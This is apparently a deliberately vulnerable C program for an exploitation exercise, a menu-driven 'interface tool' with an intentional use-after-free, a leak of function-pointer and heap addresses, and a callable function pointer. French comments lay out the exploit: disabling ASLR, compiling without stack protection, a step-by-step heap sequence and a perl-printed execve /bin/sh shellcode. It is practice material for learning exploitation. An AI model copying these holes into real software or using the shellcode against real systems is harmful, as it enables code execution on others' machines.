#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
//gcc -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -o uaf code.c
//sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"
//gcc -fno-stack-protector -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -o uaf code.c
/* but: écrire le shellcode dans le name interface+ free it+ new interface avec name =65 caractères (shellcode[60]+@)//allocate(malloc) physical connexion with name=0x pointing to begin @ of info #ASLR leak,
+call turnOn sur la 1ere interface => exec shellcode
*/
//medium+ one (our)
//strndup interesting one
#define BUFLEN 64
/* old id
struct physical{
   char info[58];
   char name[8];
};*/
/* 1st run:
 1 (create->save 1)
 (5 (show) =>name: eth0 ip: 192 turnOn: 0x7fffebaeb2c8)->alloue la struct dans celui-ci
 1 (create->save 2)
 5 (show) => name: eth2 ip: 193 turnOn: 0x7fffebaeb348
 4 (destroy "2nde")
 0 (select-> 1)
 4 (destroy "1er")
 1 (create -> sera stocke dans 1 ou 2: name: size 60 shellcode+@leak dans show (1/2 chance) (stocke dans l'autre))
 //20 shellcode+ 12 NOP +4@ (8*4)=64
 Shell:`perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xC8\xB2\xAE\xEB\xFF\x7F" x 4 '`
 5 (show -> on c'est si on est chanceux ou pas)
 0 (select 1)
 3 (turn on)
 */
 #define NAME_SIZE 48
 //64 sinon
typedef struct  __attribute__((__packed__))interface
{
	char *ip; //taille variable selon v4 or v6
    char name[NAME_SIZE];
    void (*turnOn)(struct interface*);
} Interface;
void showInterface(Interface *i);
void reset (Interface*);
void destroy (Interface*);
void turn_on_old_school(Interface *);//#ifconfig
void turn_on_modern_school(Interface *);//#ip
void endOfLine(char* line);
Interface* newInterface(char* name,char *ip, void (*on)(struct interface*))
{
    Interface* inter = malloc(sizeof(Interface));
    strncpy(inter->name, name, NAME_SIZE);
    inter->ip=strndup(ip, strlen(ip));
    inter->turnOn=on;
    return inter;
}
void victory(void){

	printf("HOURRA! \n");
}
//leakage position last champ de la structure #mauvais %p avec & en trop => on peut retrouver le debut de buffer en faisant -60
void showInterface(Interface *i)
{
    printf("\n name: %s ip: %s turnOn: %p @: %p @V: %p\n",i->name,i->ip, &i->turnOn,i,victory);
}
void endOfLine(char* line)
{
    while(*line != '\n')
        line++;
    *line = 0;
}

void destroy(Interface* inter){
    free(inter->ip);
    free(inter);
    puts("I forgot that interface !");
}
void turn_on_old_school(Interface *inter){
    puts("Set up the real Interface associated old school");
    puts("TODO: manage the IP !");
    int fd;
    struct ifreq ifr;
    struct sockaddr_in *addr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return;
    memset(&ifr, 0, sizeof ifr);
    //16
    strncpy(ifr.ifr_name, inter->name , IFNAMSIZ);
    ifr.ifr_flags |= IFF_UP;
    ioctl(fd, SIOCSIFFLAGS, &ifr);
    close(fd);
    puts("Interface up !");
    /*
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, inter.name , IFNAMSIZ);
    addr=(struct sockaddr_in *)&ifr.ifr_addr;
    inet_pton(AF_INET,ip_address,&addr->sin_addr);
    ioctl(fd, SIOCSIFADDR, &ifr);
    close(fd);*/
}
void turn_on_modern_school(Interface *i){
    puts("YET TODO: use a more modern school way to do it");
}
void reset(Interface* inter)
{
    int sockfd;
    struct ifreq ifr;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
        return;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, inter->name , IFNAMSIZ);
    //ifr.ifr_flags |= IFF_UP;
    ifr.ifr_flags &= ~IFF_UP;
    ioctl(sockfd, SIOCSIFFLAGS, &ifr);
    close(sockfd);
    //put down interface
    puts("Interface down !");
}
int main()
{
	//printf("Sizeof interface : %d", sizeof(Interface));
    printf("\n This my cool interfaceTool,I am still working on it ! \n \
The purpose of this is to speed up my network configuration.");
    int end = 0;
    char order = -1;
    char nl = -1;
    //current
    Interface* inter = NULL;
    Interface* inters[10]= {NULL};
    while(!end)
    {
        puts("\n \
 others: Quit \n \
 0: Select an virtual Interface \n \
 1: Create an virtual Interface \n \
 2: Turn down Interface \n \
 3: Turn on Interface(apply to real) \n \
 4: Forget selected virtual interface \n \
 5: Show current Interface configuration \n \
 6: get all \n \
 Your choice ?  \n");
        //\n5: Select Physical Interface info \n6: Attach Interface to physical \n7:Forget physical interface\n0: Quit");
        order = getc(stdin);
        nl = getc(stdin);
        if(nl != '\n')
        {
            puts("Bad selection, aborting \n");
            goto EXIT;
        }
        fseek(stdin,0,SEEK_END);
        switch(order)
        {
        case '0':
            puts("Which virtual interface do you want to configure ? (0-9)\n");
            char turn=getc(stdin);
            if(getc(stdin) != '\n')
            {
                 puts("Too long, aborting.");
                goto EXIT;
            }
            //(int) strtol(str, (char **)NULL, 10)
            int nb=(int)turn;
            //printf("nb: %d", nb);
            if(nb >57 || nb <48)
            {
                puts("\nBad number of interface, aborting.");
                goto EXIT;
            }
            else if(inters[nb-48]!=NULL)
            {
                inter=inters[nb-48];
            }
            else
            {
                puts("\nNot a valid interface, please create it beforehand.");
            }
            break;
        case '1':
            puts("Give the name of the real interface associated: ");
            char name[BUFLEN] = {0};
            fgets(name, BUFLEN-1, stdin);
            endOfLine(name);

            char ip[BUFLEN*3] = {0};
            puts("Give it an ip: ");
            fgets(ip, BUFLEN*3 -1, stdin);
            endOfLine(ip);

            puts("Select a 'turn on' method for the virtual interface:\n1:old school 2:modern school ?(default)\n");
            char t=getc(stdin);
            if(getc(stdin) != '\n')
            {
                puts("Bad number, aborting.");
                goto EXIT;
            }
            puts("Select a free interface to save it:(0-9) \n");
            char t2=getc(stdin);
            if(getc(stdin) != '\n')
            {
                 puts("Too long, aborting.");
                goto EXIT;
            }
            //(int) strtol(str, (char **)NULL, 10)
            int nbs=(int)t2;
            //printf("nb: %d", nb);
            if(nbs >57 || nbs <48)
            {
                puts("\nBad number of interface, aborting.");
                goto EXIT;
            }
            inter=newInterface(name,ip, (t=='1'?turn_on_old_school:turn_on_modern_school));
            inters[nbs-48]=inter;
            //double free si free là
            break;
        case '2':
            if(!inter)
            {
                puts("You must select an interface first !\n");
                break;
            }
            reset(inter);
            break;
        case '3':
            if(!inter)
            {
                puts("You must select an interface first !");
                break;
            }
            inter->turnOn(inter);
            break;
        case '4':
            if(!inter)
            {
                puts("You must select an interface first !");
                break;
            }
            destroy(inter);
            break;
        case '5':
            if(!inter)
            {
                puts("You must select an interface first !");
                break;
            }
            showInterface(inter);
            break;
              case '6':
			           for(int i=0; i<10; i++){
						   printf("inter: %d, %p, %p",i,inters[i],inters[i]!=NULL ? inters[i]->turnOn:0);
					   }
            break;
        default:
            end = 1;
        }
    }
    EXIT:
    puts("Nb:todo remove space allocated at exit");
    return 0;
}
